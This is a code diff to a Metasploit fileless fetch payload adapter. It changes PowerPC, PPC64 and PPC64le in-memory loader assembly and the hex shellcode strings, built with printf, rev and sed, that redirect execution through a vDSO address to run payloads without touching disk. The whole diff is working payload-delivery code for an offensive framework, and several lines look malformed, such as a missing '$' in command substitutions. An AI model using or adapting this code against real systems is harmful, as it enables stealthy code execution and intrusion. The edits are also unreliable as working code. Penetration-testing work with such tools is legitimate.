@@ -146,6 +146,12 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0x0c000000, #0x102c:	syscall		0x0c000000
       ]
       payload = in_memory_loader_asm.pack('V*')
+    # PPC shellcode
+    # bl 8
+    # mflr    r1
+    # lwz     r3,16(r1)
+    # mtlr    r3
+    # blr
     when 'ppc'
       in_memory_loader_asm = [
           0x0000c039, #0x1000:	li	r14, 0	0x0000c039
@@ -159,7 +165,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
           0x02000044, #0x1024:	sc		0x02000044
       ]
-      payload = in_memory_loader_asm.pack('N*')
+      payload = in_memory_loader_asm.pack('V*')
     when 'ppc64'
       in_memory_loader_asm = [
           0x39c00000, #0x1000:	li	r14, 0	0x39c00000
@@ -221,18 +227,38 @@ module Msf::Payload::Adapter::Fetch::Fileless
       %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armbe'
       %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
+    
     when 'mipsle'
       %^$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
     when 'mipsbe'
       %^"2409"$(echo (printf %04x $vdso_addr))"0120000800000000"^
     when 'mips64'
       %^$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
+    
+    # PPC shellcode
+    # bl 4
+    # mflr    r18
+    # lwz     r3,16(r18)
+    # mtlr    r3
+    # blr
     when 'ppc'
-     %^$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
+     %^"480000057e4802a6807200107c6803a64e800020"$(echo $(printf %04x $vdso_addr))^ 
+    # PPC64 shellcode
+    # bl 4
+    # mflr 18
+    # ld 3,16(18)
+    # mtlr 3
+    # blr
     when 'ppc64'
-      %^"3800"$(echo (printf %04x $vdso_addr))"7c0803a64e800020"^
+      %^"480000057e4802a6e87200107c6803a64e800020"$(echo (printf %016x $vdso_addr))^
+    # PPC64le shellcode
+    # bl 4
+    # mflr 18
+    # ld 3,16(18)
+    # mtlr 3
+    # blr
     when 'ppc64le'
-     %^$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
+     %^"05000048a602487e100072e8a603687c2000804e"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^ 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
